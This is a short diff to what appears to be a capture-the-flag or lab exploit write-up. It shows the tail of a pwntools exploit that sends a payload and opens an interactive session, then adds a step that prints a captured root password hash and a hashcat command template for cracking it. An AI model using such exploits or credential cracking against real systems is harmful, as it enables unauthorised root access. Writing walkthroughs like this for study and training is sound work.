@@ -147,3 +147,9 @@ payload = fit({
 proc.sendline(payload)
 proc.interactive()
 ```
+___________________________________________________________________________________________________________________________________________________
+
+Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is "$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
+
+hashcat {flags} {hashfile} {wordlist}
+
